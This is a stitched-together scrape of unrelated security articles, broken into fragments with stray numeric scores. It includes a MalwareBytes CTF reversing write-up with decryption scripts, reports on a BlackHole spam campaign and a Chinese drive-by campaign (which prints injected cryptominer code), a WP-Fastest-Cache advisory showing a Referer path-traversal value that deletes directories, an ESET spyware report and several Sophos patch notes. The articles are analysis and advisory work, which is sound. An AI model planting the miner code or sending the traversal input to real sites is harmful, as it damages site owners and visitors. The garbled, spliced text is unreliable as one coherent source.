import io
from PIL import Image",0.016031621879583846
"imo = Image.open(""dTHXed7.png"")
rawdata = list(imo.getdata())
tsdata = ''
for x in rawdata:
for z in x:
tsdata += chr(z)",0.019113512906046015
"file = open(""blob.bin"",""wb"")
file.write(tsdata)
file.close()
I seriously don’t like python… at first I forgot to use ‘wb’ and used ‘w’ instead and got a corrupted .exe. It was obviously misaligned, cuz of new line battle between Windows and *NIX. So, maybe it’s not Python I don’t like after all.
After fixing the ‘wb’ I got the nice DLL.
Well… not so nice…
When you load it it doesn’t obviously work and just laughs at you telling you that you failed.
Okay..
Quick analysis shows that there is a code that modifies VEH (Vector Exception Handler) using two AddVectoredExceptionHandler calls.
The first routine:
The second routine:",0.012892877719950069
"So… now we know that it tries to protect itself from analysts by checking if it is loaded inside the pyinstaller.exe and also checking if the analysts is not using some instrumentation. At least this is my assumption i.e. that’s why the environment variable mb_chall is set in the first routine and later checked inside the other. If you bypass some bit, the other bit won’t work.
Only if the PID stored in the environment variable is correct the handler will redirect the code execution by EIP+-6.
This is too much for me to handle and instead of killing myself with analysing this stuff inside the pyinstaller I patched the python27.dll check (NOP NOP NOP NOP), and then once I found out about the EIP change I just went and directly analyzed the code at the EIP+6 – so we just need to execute the console_thread (this is a name I’ve given this routine).",0.012293502522422228
"So now we can start analysis from this place.
Surprise…
A thread is created that calls EnumWindows, then a callback checks if the dedicated console window with the predetermined window text is available. The internals of it don’t interest me too much as I am just… craving for the flag.
So, I quickly identify that once the console window is present an EnumChildWindows API will be called with another callback.
And this second callback is where the real juice is.
Again, ignoring the inner workings of the console window I realize that the command it accepts is ‘dump_the_key’.
I instrument the code to decrypt (RC4) a small 617 bytes long blob at 0x10032000 and I get the base64-encoded string:
eJx9lL1OAkEQx+sreIeLlUQKBPXUxAISYmehD2As
/IrEGKQwMT4AJLzD5ioIhNwd9wEFhQJ+JNgo/YUg
4CVEE7ji7LzdPe4GOWl+2czO/GdnZnc/jgfoamxc
mvrJqHuaL2znssxgdDTUz/oWW0fLSLjRKiFMhVDC
VGVCYlFFwiqmImBKlE2wlkKCFWmVWMHaoFQIZcAa
YRUzImBy1NLwyNEo1VPgJLIWCSte7EwWSgkoV0AU
zCj/tXPaXBTNq5YY98yKl905D/URQKwGPFVwThHr
OGta1yPYBcozFWmgY9P+MG5eGfjX5tSqng+1Rx9A
t1tEh3ag+W/trF/tcKZ2FON7fnFuaqBXnODZ3Ykw
0+xOVG2uhwvrolXYPl5/wD3haosUfO8DM9sTR0EE
U274VOFOlvbBtoctdb2EwpYWwVRXMaUwsUSJhSNM
EG4RbmIqa8QzggqBbAa/WX2SHqMdxC/hl/udQgZr
fLHTJ4yfc2aQ7A4PJ2YK1dneZypvBFGROlybY1vk
/MtI57Ea+QfyB+ZPsl+Ov73sPnfYIop3exfl19hT
a69zjwN5rHbLI3vLzb6C+DvephO733pPdPRYux3M
ZeHfEsj+AqgYif8=",0.014613287732829772
"Now… this bit, according to the code of the DLL is injected into the memory address of actxprxy.dll that is loaded into this process. Mind you this is supposed to be loaded inside the pyinstaller crazy process child.
Luckily, this actxprxy.dll rings a bell as I saw the python code that expects this data inside the PyInstaller madness:
def decode_pasted():
my_proxy = kernel_dll.GetModuleHandleA('actxprxy.dll')
if my_proxy is None or my_proxy == 0:
return False
else:
char_sum = 0
arr1 = my_proxy
str = ''
while True:
val = get_char(arr1)
if val == '\x00':
break
char_sum += ord(val)
str = str + val
arr1 += 1",0.01310651976850119
"print char_sum
if char_sum != 52937:
return False
colors = level3_colors()
if colors is None:
return False
val_arr = zlib.decompress(base64.b64decode(str))
final_arr = dexor_data(val_arr, colors)
try:
exec final_arr
except:
print 'Your guess was wrong!'
return False",0.01767077184842436
"return True
So… knowing what happens to this data, I de-Base64, dezlibbed, and got the raw data.
Yet it’s still encrypted… but we are already finishing.
The encryption is based on the color values R, G, B so it has to be 3 bytes long.
Instead of finding out in any smart way, I brute force the encrypted blob on a single-xor key basis and quickly identify first color to be 0x80, then using the same trick the second color to be 0x0 and third to be 0x80.
Now.. a quick perl code and a quick decrypting routine:
use strict;
use warnings;",0.015099539188637712
"my $f=shift || die (""Gimme a file name!\n"");
open F,""<$f"";
binmode F;
read F,my $data,-s $f;
close F;",0.015365747716237332
my $newdata = '';,0.015695944067936285
"my $key=""\x80\x00\x80"";
my $n=0;
for (my $i=0; $i<length($data); $i++)
{
my $b=ord(substr($data,$i,1));
my $k=ord(substr($key,$n,1));
$newdata.=chr($b^$k);
$n++;$n=0 if ($n>(length($key)-1));
}",0.012317292164954585
"open F,"">$f.out"";
binmode F;
print F $newdata;
close F;
We now get a flagship python code:
import colorama
from colorama import *
def print_flag():
flag_hex = (
0x73, 0x75, 0x72, 0x64, 0x65, 0x61, 0x68, 0x50, 0x20,
0x2D, 0x20, 0x22,0x2E, 0x6E, 0x65, 0x64, 0x64, 0x69,
0x68, 0x20, 0x79, 0x6C, 0x6C, 0x75, 0x66, 0x65, 0x72,
0x61, 0x63, 0x20, 0x6E, 0x65, 0x65, 0x62, 0x20, 0x73,
0x61, 0x68, 0x20, 0x74, 0x61, 0x68, 0x77, 0x20, 0x73,
0x65, 0x76, 0x69, 0x65, 0x63, 0x72, 0x65, 0x70, 0x20,
0x77, 0x65, 0x66, 0x20, 0x61, 0x20, 0x66, 0x6F, 0x20,
0x65, 0x63, 0x6E, 0x65, 0x67, 0x69, 0x6C, 0x6C, 0x65,
0x74, 0x6E, 0x69, 0x20, 0x65, 0x68, 0x74, 0x20, 0x3B,
0x79, 0x6E, 0x61, 0x6D, 0x20, 0x73, 0x65, 0x76, 0x69,
0x65, 0x63, 0x65, 0x64, 0x20, 0x65, 0x63, 0x6E, 0x61,
0x72, 0x61, 0x65, 0x70, 0x70, 0x61, 0x20, 0x74, 0x73,
0x72, 0x69, 0x66, 0x20, 0x65, 0x68, 0x74, 0x20, 0x3B,
0x6D, 0x65, 0x65, 0x73, 0x20, 0x79, 0x65, 0x68, 0x74,
0x20, 0x74, 0x61, 0x68, 0x77, 0x20, 0x73, 0x79, 0x61,
0x77, 0x6C, 0x61, 0x20, 0x74, 0x6F, 0x6E, 0x20,0x65,
0x72, 0x61, 0x20, 0x73, 0x67, 0x6E, 0x69, 0x68, 0x54,
0x22 )
flag_str = """"
for i in flag_hex:
flag_str = chr(i) + flag_str
init()
print(Style.BRIGHT + Back.MAGENTA) + ""flag{"" +
flag_str + ""}"" + (Style.RESET_ALL)
print_flag()
We have to run it to FINALLY get the flag:
“Things are not always what they seem;
the first appearance deceives many;
the intelligence of a few perceives what has been carefully hidden.”
– Phaedrus
That’s it…
As you can see I skipped through many parts in the interest of ROI and kinda luckily was able to bypass a number of tricks or disturb the assumed flow of events using aggressive code instrumentation and by understanding the code of the main module (python) and how it interacts with the assembly (DLL). Some people who tried to crack it reached out to me and many of them tried to do the analysis the hard way i.e. inside the pyinstaller – it is obviously possible, but so much harder! Remember kids: cheating is reversing! Or the other way around!
Hope you enjoyed it!
I want to thank @hasherezade for creating the CTF. It was fun!",0.02682441206329833
Comments Off on MalwareBytes CTF: Capturing the flag I didn’t plan to catch…,0.009671687932665929
"Comments are closed.
",0.01623942207169282
"Cybercriminals are currently spamvertising millions of emails impersonating the Windstream Corporation, in an attempt to trick end and corporate users into clicking on links found in the malicious email.
Upon clicking on the links hosted on compromised web sites, users are exposed to client-side exploits served by the BlackHole web malware exploitation kit.
More details:",0.014012630599908538
Screenshot of a sample malicious email used by the cybercriminals:,0.008681945059187623
"Spamvertised URL: hxxp://madaboutleisure.wsini.com/Ua8ndKkr/index.html?s=883&lid=2325&elq=11f7b1b5179f45b09737bdf10d0fe61f
Redirects to: hxxp://108.170.18.39/search.php?q=fa16f5d3def51288 (responding to mx39.diplomaconnection.org), AS20454, ASN-HIGHHO
Client-side exploits served: CVE-2010-1885
Redirection chain for the client-side exploit: hxxp://madaboutleisure.wsini.com/Ua8ndKkr/index.html?s=883&lid=2325&elq=11f7b1b5179f45b09737bdf10d0fe61 ->
hxxp://icanquit.co.uk/wvGCntXp/js.js -> hxxp://108.170.18.39/search.php?q=fa16f5d3def51288 -> hxxp://108.170.18.39/Set.jar -> hxxp://108.170.18.39/data/ap2.phpi
Upon successful exploitation, two executables are dropped on the infected hosts, MD5: 088ff8b667d3e6a6f968ad6b41aa4fb0 and MD5: 1b1bbf726902beb3b25d11fbdc58720f – detected by 11 out of 42 antivirus scanners as Worm:Win32/Gamarue.I; Gen:Variant.Kazy.72780.
Webroot SecureAnywhere users are proactively protected from this threat.
You can find more about Dancho Danchev at his LinkedIn Profile. You can also follow him on  Twitter.
",0.009160154030440903
Patch Tuesday squashes 89 bugs-including a SophosLabs find,0.013253099951382241
"No bugs known to be exploited in the wild, but plenty of serious flaws that need updates",0.008943125795394469
"Written by
SophosLabs Offensive Security",0.008622298185940958
"June 11, 2019",0.008599629573300849
SophosLabs Uncut Adobe Chakra ChakraCore Edge Exploits Flash Player Hyper-V Microsoft Patch Tuesday polar bears SandboxEscaper updates VBscript vulnerability Windows,0.011307194905757711
"June’s Patch Tuesday release from Microsoft consists of 89 fixes for security bugs in Windows and other Microsoft products, with 20 of them classified as critical by the software company.
Included among these most serious bugs fixed today is a remote code execution vulnerability with the tracking handle CVE-2019-0888, which was reported to Microsoft by the SophosLabs Offensive Security team.
Not to be left out with all these Microsoft patches, Adobe published an update to Flash Player to address a security vulnerability that could lead to a malware infection if left unfixed.
The number of bugs that fall under the “Elevation of Privilege” (EoP) classification is 24. An EoP bug may allow an attacker with access to a system to gain more control over it. 18 of the bugs fixed in this update could be used to deliver remote code to a browser. An additional 10 bugs affect document reader programs, such as Word or Excel, and can be potentially used to compromise a system if a user is tricked into opening a malicious document.
For the first time in a while, none of the bugs are known to have been used in the wild at the time of publishing.
It’s worth reminding readers that the availability of patches does not mean that your computer has installed them, yet. To find and download this month’s Cumulative Update patch yourself, search for the term “2019-06” at the Microsoft Update Catalog website.
Now for some words on the most notable vulnerabilities fixed in this month’s release:",0.012929097168394854
"ActiveX Data Objects (ADO) Remote Code Execution
CVE-2019-0888
The fix for another bug discovered by the SophosLabs Offensive Security Team has made its way into a Patch Tuesday release. The bug is a Use-After-Free vulnerability in the Recordset Object of ADO and is most easily triggered from VBScript.
As Microsoft writes on its technical analysis, “an attacker could craft a website that exploits the vulnerability and then convince a victim user to visit the website” Because it requires user interaction for successful exploitation, was privately disclosed, and has not been seen in the wild, we feel it’s safe (for the meantime) to deem it a low impact bug.
We have subsequently published an article describing the technical details behind the bug and its exploitation.
Hyper-V Remote Code Execution
CVE-2019-0620, CVE-2019-0709, CVE-2019-0722
Three separate bugs, categorized as Remote Code Execution and ranked Critical, have been fixed in Hyper-V, the Windows component providing support for hardware virtualization.
While the technical details of these bugs have not been disclosed by Microsoft, it’s reasonable to assume they open the possibility of performing virtual machine “escape” attacks, where code on a guest virtual machine could jump out of the virtual environment and execute in the host machine running the VM.
Virtual machines are often used to create segregated virtual environments where unsafe programs can be run without the risk of them having any effect on the host machine, so this is troubling for those who use Hyper-V for this purpose.
Hey there, little guy!
Windows Elevation of Privilege
CVE-2019-1053, CVE-2019-1064, CVE-2019-1069
Three of the disclosed Elevation of Privilege bugs originate from the notoriously eccentric vulnerability researcher, SandboxEscaper.
Keeping true to her M.O., she “disclosed” the aforementioned bugs by publishing 0-day exploits for them on her github page in the weeks leading up to this month’s Patch Tuesday. She then subsequently deleted the repository of PoC exploits and uploaded a directory full of pictures of polar bears, which are also at risk (though not from these vulnerabilities).
Chakra & VBScript Remote Code Execution
CVE-2019-0920, CVE-2019-0988, CVE-2019-0989, CVE-2019-0990, CVE-2019-0991, CVE-2019-0992, CVE-2019-0993, CVE-2019-1002, CVE-2019-1003, CVE-2019-1005, CVE-2019-1023, CVE-2019-1024, CVE-2019-1051, CVE-2019-1052, CVE-2019-1055
You’d think that, at a certain point, the obsolete, dormant project that is the VBScript engine would run out of security bugs after weekly bug discoveries and fixes for years on end, but it’s June, 2019 and the VBScript bug body count for this month is three.
It’s worth reiterating that VBScript is only supported by the (now deprecated) Internet Explorer browser–and even then, it’s blocked for Internet sites by default.
Another gift that gives on giving users a reason to update is the Edge browser (and its Chakra JavaScript engine), with 12 new Remote Code Execution bugs.
Sophos coverage
Sophos has released following detection to address the vulnerabilities mentioned above.   Please note that additional vulnerabilities and corresponding detection may be released in the future.",0.011988216284036124
"CVE
SAV
IPS
Intercept-X",0.010185298729769032
"CVE-2019-1041
Exp/20191041-A
N/V
N/V",0.01119165920248577
"CVE-2019-1053
Exp/20191053-A
N/V
N/V",0.011110694377293062
"CVE-2019-1064
Exp/20191064-A
N/V
N/V",0.011534351312875168
"CVE-2019-1069
Troj/PrivEsc-E
N/V
N/V",0.010153090846071078
"N/V = Not Validated. The PoC code provided with MAPP advisories does not include active exploits and as such is not applicable to Intercept X testing. The IX ability to block the exploit depends on actual exploit weaponization approach which we won’t see until it’s spotted in the wild. The SAV and IPS detections developed for the PoCs do not guarantee interception of in-the-wild attacks
Additional IPS Signatures",0.00885649694516133
Microsoft,0.01083142353498212
CVE,0.015603552773460372
SID,0.008271028222603172
"CVE-2019-1003
9000969",0.009966638558893792
"CVE-2019-1005
9000970",0.009996800703005237
"CVE-2019-1024
9000971",0.010036463628282033
"CVE-2019-1051
9000972",0.010088679812930268
"CVE-2019-1052
9000973",0.010042400866788759
"CVE-2019-1055
9000974",0.010355693423840906
"CVE-2019-7788
2201204",0.009084802791795243
"CVE-2019-1002
2201239",0.008744186274066035
"CVE-2019-0991
2201238",0.008612480294918012
"CVE-2019-0992
2201238",0.008802219074979023
"CVE-2019-0993
2201238",0.008835652584809117
"CVE-2019-0990
2201237",0.008542875867149302
"CVE-2019-0989
2201236",0.008548440818541225
"CVE-2019-0988
2201235",0.00836318393337454
"CVE-2019-0985
2201234",0.008321058613473875
"CVE-2019-0920
2201233",0.008548199040400162
Adobe,0.00940443541059821
"CVE
Sid",0.008741579345108219
"CVE-2019-7845
9000975",0.010293274453736734
"How long does it take to have Sophos detection in place?
We aim to add detection to critical issues based on the type and nature of the vulnerabilities as soon as possible. Please note that some detection might not be available due to the availability of the data.
It is mostly not possible to test with Intercept-X due to the nature of the data we receive.
What if the vulnerability/0-day you look for is not covered above?
The most likely reason for this is we did not receive enough information about the vulnerability to create detection.",0.011784069928644891
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
"Share on LinkedIn
",0.009855679767380665
"Drive-by download campaign targets Chinese websites, experiments with exploits
During our web crawls we sometimes come across bizarre findings or patterns we haven’t seen before. This was the case with a particular drive-by download attack planted on Chinese websites. While by no means advanced (it turned out to be fairly buggy), we witnessed a threat actor experimenting with several different exploits to drop malware.
For years we have cataloged thousands of Chinese websites injected with the same malicious and rudimentary VBScript code. Even to this day, you can find a countless number of sites that have been (or still are) compromised with that pattern, and most of them happen to be hosted in China.",0.009784859520681644
"The campaign we stumbled upon starts with sites that were compromised to load external content via scripts and iframe overlays. Although the browser’s address bar shows gusto-delivery[.]com, there are several injected layers that expose visitors to unwanted code and malware.",0.010364949339108254
"For instance, we find a reference to a Coinhive clone:
var miner = new ProjectPoi.User('LUdKfdXyeXp9sQZf1pphGOrY', 'john-doe', {
threads: navigator.hardwareConcurrency,
autoThreads: false,
throttle: 0.2,
forceASMJS: false
});
miner.start();",0.011071333627633129
"We are unsure whether this is a pure ripoff (the website template is almost identical), but one is different from the other in that the Chinese version (hosted at ppoi[.]org) only takes a 10 percent commission as opposed to 30 percent for Coinhive.
也就是说，您将获得挖矿收益的90%，与矿池不同，这个收益是固定的，不论是否爆块您都将获得该笔收益
我们希望保留10%来补偿不爆块的损失，维持服务器的运行等",0.01739766870419246
"I.e. you get 90% of the average XMR we earn. Unlike a traditional mining pool, this
rate is fixed, regardless of actual blocks found and the luck involved finding them.
We keep 10% for us to operate this service and to (hopefully) turn a profit.
Finally, the most interesting aspect here is the redirection to a server hosting a few exploits as described in the diagram below:",0.013986452861421972
"On top of a late addition of the aforementioned VBScript similar to the ones found on other Chinese websites, we notice the inclusion of 3 exploits targeting older vulnerabilities in an ActiveX component, the Flash Player and Internet Explorer.
CVE-2008-2551
This old CVE is a vulnerability with the C6 Messenger ActiveX control. The threat actor reused the same code already published here and simply altered the DownloadUrl to point to their malicious binary. Users (unless their browser settings have been changed) will be presented with a prompt asking them to install this piece of malware.",0.007088232512592163
"CVE-2015-5119
This is a Flash Player vulnerability affecting Flash up to version 18.0.0.194, which was again lifted from a proof of concept. Its implementation in this particular drive-by is somewhat unstable though and may cause the browser to crash.",0.008765581296209524
"CVE-2016-0189
Finally a more interesting CVE, the well-known Internet Explorer God Mode, although for some unexplained reason, the code was commented out.",0.011678413241758334
"The final payload dropped in this campaign is a DDoS bot, which we will cover in another blog post.
Conclusion
Although we see the use of several exploits, we cannot call this an exploit kit—not even an amateur one. Indeed, the domain serving the exploits appears to be static and the URIs are always the same.
Regardless, it does not prevent threat actors from arranging drive-by attacks by copying and pasting various pieces of code they can find here and there. While not very effective, they may still be able to compromise some legacy systems or machines that have not been patched.
Indicators of compromise
Malicious redirection
vip.rm028[].cn
by007[.]cn
Exploit domain and IP
shiquanxian.cn
103.85.226.65
CVE-2008-2551
5E3AC16B7F55CA52A7B4872758F19D09BD4994190B9D114D68CAB9F1D9D5B467
CVE-2015-5119
D53F3FE4354ACFE7BD12528C20DA513DCEFA98B1D60D939BDE32C0815014137E
Payload
65ABED6C77CC219A090EBEF73D6A526FCCEDAA391FBFDCB4B416D0845B3D0DBC
",0.010107862228531994
Sophos products are not at risk from the latest OpenSSL bug,0.008323750478378744
"Written by
Editor",0.007990427730288352
"July 10, 2015",0.008442777147044778
Cloud Network Partners Products & Services OpenSSL Vulnerabilities,0.00713780073238357
"You may have seen the OpenSSL team announced, on Monday 2015-07-06, that it had a “high severity” update coming out in three days’ time. The update was published Thursday 2015-07-09.
The good news is no Sophos products are at risk from this bug. Only the current pre-release Beta version of Sophos Management Communication System (MCS 3.0.0 Beta), a component used by Sophos Cloud and UTM Endpoint products, includes an affected version of OpenSSL. However, MCS does not use the relevant part of the OpenSSL code for certificate verification, so cannot fall foul of the bug. Nevertheless, we expect to update MCS 3 Beta with the latest OpenSSL version by mid-August 2015.
All other Sophos product families either don’t use OpenSSL at all, or use one of the unaffected versions.",0.011221144826699225
"For more information see the links below. If you have any questions please contact your account manager in the first instance.
Learn more about OpenSSL CVE-2015-1793 (Naked Security)
See the latest Sophos support information (KBA)",0.012096215581059555
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
"Share on LinkedIn
",0.009855679767380665
"Arbitrary Directory Deletion in WP-Fastest-Cache
Exploitation Level: Easy / RemoteDREAD Score: 6.6Vulnerability: Arbitrary Directory DeletionPatched Version: 0.8.9.1
The WP-Fastest-Cache plugin authors released a new update, version 0.8.9.1, fixing a vulnerability (CVE-2019-6726) present during its install alongside the WP-PostRatings plugin. According to seclists.org:
“A successful attack allows an unauthenticated attacker to specify a path to a directory from which files and
directories will be deleted recursively. The vulnerable code path extracts the path portion of the referrer header and
then uses string concatenation to build an absolute path. This path is then passed to the ‘rm_folder_recursively’
function which deletes folders and their files in a recursive manner.”
Deleting Arbitrary Directories in WordPress
When the correct conditions are met, this vulnerability allows visitors to delete entire directories on affected websites.
public function wp_postratings_clear_fastest_cache($rate_userid, $post_id){
// to remove cache if vote is from homepage or category page or tag
if(isset($_SERVER[""HTTP_REFERER""]) && $_SERVER[""HTTP_REFERER""]){
$url = parse_url($_SERVER[""HTTP_REFERER""]);",0.010623743618295989
"$url[""path""] = isset($url[""path""]) ? $url[""path""] : ""/index.html"";",0.014963120625448467
"if(isset($url[""path""])){
if($url[""path""] == ""/""){
$this->rm_folder_recursively($this->getWpContentDir(""/cache/all/index.html""));
}else{
$this->rm_folder_recursively($this->getWpContentDir(""/cache/all"").$url[""path""]);
}
}
}
(...)
}
The method is hooked to the rate_post action, which is executed by the WP-PostRatings plugin.
Note that WP-PostRatings isn’t vulnerable all by itself. Its presence is just a condition for the exploit to work. If the plugin is not installed, the vulnerability cannot be exploited.
This bug is only exploitable if both plugins are installed and active on the same site.
Thousands of WordPress Sites Affected
In this detailed article, the researcher who found this issue mentions that it may affect close to 10,000 sites.
Since $_SERVER[‘HTTP_REFERER’] may be controlled by the user, nothing prevents them from sending “http://vulnerable-site.com/../../../” in the Referer field to make the whole website unreachable for anyone.
Recommendations
If you use the WP-Fastest-Cache plugin, we recommend that you update it to its latest version (version 0.8.9.1) as soon as possible.
We always advise webmasters to use as few plugins as possible and keep them all updated.
If you are looking for peace of mind, we offer a very robust website security platform with website monitoring, malware removal, and protection against attacks and hacks.
",0.012792161766108201
"Tax returns: Slovakian spyware campaign
ESET’s Security Research Lab details a malware-spreading campaign leveraging the deadline for tax returns in Slovakia and examines a case of infection where a bank's two-factor authentication prevented financial loss.",0.016476162355531287
24 May 2013 - 12:08PM,0.011302482223570998
ESET’s Security Research Lab details a malware-spreading campaign leveraging the deadline for tax returns in Slovakia and examines a case of infection where a bank’s two-factor authentication prevented financial loss.,0.014083871691759509
"ESET’s Security Research Lab has been monitoring a malware-spreading campaign based around the March deadline for tax returns in Slovakia. Whilst this was mostly a local attack, the case demonstrates how effective and dangerous such social engineering attacks can be in general when trending topics, or other credibility-adding-tricks, are used.",0.010267943026577964
The Spreading Campaigns,0.01093061367049386
"The attack vector in the two campaigns that we discovered were e-mails purporting to be from the Slovak Tax Office (equivalent to the Internal Revenue Service in the US, or the UK’s HM Revenue and Customs). Screenshots of the HTML-formatted e-mails used are shown below.",0.01448812379300135
"The translated subject of the emails read: Notification of real estate tax changes and the text, written in proper Slovak, states that payment instructions are to be found in the included attachment. It is interesting to note that this social engineering approach was made more credible by the fact that each taxable entity in the Slovak Republic must use a unique bank account for tax payment. The attacker was not just fluent in Slovak but also well-enough acquainted with local tax legislation to devise such a believable scam.",0.014311189206583919
"The attacker modified the delivery method slightly in between the two spam campaigns, but the malware served up in the campaign remained the same.",0.014463602034748835
"The first wave of emails offered the “attachments” as download links (on a popular file-sharing service) to one of two files, each in a different format: an RTF file that masqueraded as a Microsoft Word document or an executable file. The RTF file contained an exploitation of CVE-2010-3333 which, if successful, also delivered the malicious executable. The good news was that, according to the file-sharing download statistics, the success rate of the exploit downloading the malware was less than 10%. Unfortunately, many people still opted to download the executable directly from the second (backup) link in the email, perhaps after seeing a garbled-looking document.",0.015393376544716175
"The second campaign was more straightforward and, according to download statistics, more successful. The hypertext link in the email pointed to an executable file (with a .SCR extension), without explicitly mentioning the file format.",0.01102935939159655
The Malware,0.008918915196794885
"The malware used in these attacks was an ordinary credentials-stealing Trojan, which was already detected prior to these campaigns. ESET’s software detects it as Win32/Sazoora.A.",0.018725524690303752
"Win32/Sazoora.A is designed to steal a victim’s logon credentials from web browsers. Specifically, the Trojan contains libraries for injecting into Internet Explorer, Mozilla Firefox or Google Chrome. Win32/Sazoora implements several data-stealing techniques:",0.013492879595202623
"Intercept any information entered into HTML forms in the aforementioned browsers
Extract stored credentials from the browsers
Inject fraudulent HTML code into webpages in order to steal credit-card related data",0.010630617909629714
The stolen data is then periodically sent to a remote server (the URLs of which are hard-coded in the binary). The following screenshots show the HTML web-injects used to lure the victim into entering his credit-card credentials.,0.013968587618214623
"The last screenshot – of a payment form for Microsoft Windows Updates – is particularly interesting. Note that none of the above mentioned techniques are novel at all, and are commonly used by banking Trojans such as the infamous Zeus and SpyEye families. But unlike those families, Win32/Sazoora.A features configuration options that are less dynamic as regards both the Command & Control server addresses and the web-inject HTML hard-coded in the analyzed binary.",0.010801528703922259
"ESET LiveGrid® detection rates for Win32/Sazoora indicate that the Trojan was mostly seen in Slovakia (over 60% of all detections), undoubtedly as a result of these campaigns. The country with the second highest number of detections is Switzerland, but it is important to note that Sazoora is a generic information stealing Trojan, not customized in the Slovak attacks in any way, except for the C&C server address, so the Swiss detections may just indicate that the actual author of the malware has sold it to multiple clients.",0.01180100537339901
The Victims,0.009961534449108078
"Our telemetry indicates that many of the targets successfully infected through malware-spreading emails weren’t accidental or purely random. The emails were mass distributed using a generic list of hopefully-Slovak e-mail addresses. And as it turned out, some of the victims identified so far include physicians, accountants and several institutions. These were considerably more likely to click on the links, as the content of the e-mail was relevant to their profession (and also the upcoming tax deadlines made it even more likely for them to check the content).",0.011820480816502887
"We have also performed a detailed analysis of one victim’s infected computer at their request after they noticed suspicious activity relating to their bank account. It turned out that they received one of the aforementioned emails, were infected by Win32/Sazoora.A and had their online banking credentials stolen. The most interesting thing about this infection, however, was the fact that the attacker was prevented from stealing any money from the victim’s account by the bank account’s grid-card protection, a kind of multifactor authentication. The attacker then sent the victim a phishing email passed off as some kind of client verification by the bank, in which they asked for a specified code from the grid-card. The victim was not fooled by this attempt.",0.011391348770713017
"Other victims may not have been so fortunate. This case again confirms the necessity for employee education with regard to phishing (and information security in general), especially when the employees handle sensitive corporate or customer data.",0.012635710318607662
"Kudos to Peter Košinár, David Gabriš and Miro Babiš for their work on the case.
",0.014319109376026096
"Patch Tuesday targets Hyper-V virtual machines in November, 2019 updates",0.01165243700034424
"Written by
SophosLabs Offensive Security",0.008622298185940958
"November 12, 2019",0.009193057613064881
SophosLabs Uncut Threat Research 2019-11 ChakraCore Hyper-V IE kernel Microsoft Patch Tuesday VBscript Windows Windows Subsystem for Linux WSL,0.010039092143491413
"Microsoft released their monthly security updates for November, 2019, this morning. This month, Microsoft said the company fixed a total of 73 vulnerabilities across its product lines. Thirteen of the fixes address problems Microsoft classifies as Critical, the most urgent type of problem to address. The company classified the repair of an additional 59 bugs as Important.
Bugs discovered in the Hyper-V hypervisor were the most numerous this month. Microsoft fixed 9 Hyper-V vulnerabilities, five of which could potentially have been leveraged during an attack to perform remote code execution. The remaining fixes target a group of components that routinely get security updates: the Jet Database Engine, the Microsoft Office360 suite, various scripting engines (VBScript and Chakra), and the Windows kernel (Win32k, GDI, WSL).
The fixes in these other components also span the gamut, addressing things ranging from relatively-mundane information leaks, to privilege elevation, to the potential for remote code execution.
As has been the case recently, Adobe synchronized the release of its ADV190026 (Critical) security update advisory about Flash Player to Patch Tuesday as well. The updates for Adobe products come from Adobe and may not be updated as part of the Windows Update process.
SophosLabs has broken down the most critical bits of the November 2019 edition of Patch Tuesday you need to be aware of:
Hyper-V
(CVE-2019-0712, -0719, -0721, -1309, -1310, -1389, -1397, -1398, -1399)
Although the past several months were dominated by patches around RDP, this month update has a noticeably large number of Hyper-V patches. A few of the repaired vulnerabilities (CVE-2019-0719, -0721) fix a problem in the Hyper-V VmSwitch, which in its pre-patch state might permit an attacker to execute code on the host operating system.
What Microsoft refers to as a failure to properly validate input from an authenticated user on a guest operating system we more colloquially describe as a VM escape, where malicious code running on a VM can jump out of the virtual environment of the VM, and onto the host machine. It’s a serious problem easily fixed by updating.
Windows kernel
(CVE-2019-1393, -1394, -1395, -1396, -1408, -1434, -1436, -1440, -1441)
Microsoft found and fixed several memory corruption vulnerabilities in the Win32k and GDI kernel components. Although those vulnerabilities vary by their nature (eg., use-after-free, or buffer overflow), their successful exploitation would allow an attacker to locally elevate their privileges; or in the case of a remote scenario (and coupled with, at least, a browser exploit) such vulnerabilities could be triggered remote and allow a browser sandbox escape, giving full control of the affected computer to the attacker.
Windows Subsystem for Linux
(CVE-2019-1416)
Although the company gave us no in-depth details about this vulnerability, Microsoft has deemed this vulnerability in the Windows Subsystem for Linux (WSL) component of Windows significant enough to merit an ‘Important’ categorization, and a patch.
The vulnerability itself is a race condition in Windows Subsystem for Linux, which (upon success) could allow a locally-authenticated attacker to execute privileged code.
Scripting engines
(CVE-2019-1390, -1426, -1427, -1428, -1429)
As usual, a variety of components from Microsoft’s Web browser engines (Internet Explorer / Edge / Chakra / VBScript) were not spared updates. Several vulnerabilities were found, some of which could lead to code execution simply by visiting a page.
Detection guidance
Sophos endpoint and network protection products have released the following signatures designed to detect exploit attempts against the vulnerabilities listed below.",0.012020543181560428
CVE,0.015603552773460372
"SAV
IPS",0.008324003224466248
"CVE-2019-1390
Exp/20191390-A
2301155",0.009948749226954767
"CVE-2019-1429
Exp/20191429-A
2301156",0.009542841246446776
"How long does it take to have Sophos detection in place?
We aim to add detection to critical issues based on the type and nature of the vulnerabilities as soon as possible. In many cases, existing detections will catch exploit attempts without the need for updates.",0.012693935054493566
"What if the vulnerability/0-day you’re looking for is not listed here?
If we haven’t released an update for a specific exploit, the most likely reason is that we did not receive the data that shows how the exploit works in the real world. As many of this month’s exploits were crafted in a lab and have not been seen in the wild, nobody has enough information (yet) about how criminals would, hypothetically, exploit any given vulnerability. If or when we receive information about real attacks, we will create new detections, as needed.",0.011427794767576605
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
"Share on LinkedIn
",0.009855679767380665
UTM Up2Date 9.208 Released,0.008858193972508976
"Written by
Eric Bégoc",0.010229904213713614
"October 10, 2014",0.008690474132424408
Network up2date UTM UTM 9,0.01007005226623292
"Today we made available  a new Up2Date package for Sophos UTM which will introduce a security fix for CVE-2014-6271 .
Please note, that to date we are not aware that the Sophos UTM is exposed to the described vulnerabilities and this release is a precautionary update.
Please read on to see the full details of this release.",0.009521546839584283
"Sophos UTM 9.208
News",0.009371028497388467
"Security Release
Update bash package to fix potential vulnerabilities
References: CVE-2014-6271, CVE-2014-7169, CVE-2014-7186, CVE-2014-7187
So far we are not aware of any service on UTM actually exposing these problems to attackers, this is a precautionary update.",0.008685314361769225
Remarks,0.009780636038266843
System will be rebooted,0.007758715382572667
Bugfixes,0.009816324567177737
33059 CVE-2014-6271 bash: specially-crafted environment variables can be used to inject shell commands [9.2],0.0061789738170759945
"Up2date link:
ftp://ftp.astaro.com/UTM/v9/up2date/u2d-sys-9.207019-208008.tgz.gpg",0.010127896716934592
"Up2date MD5sum:
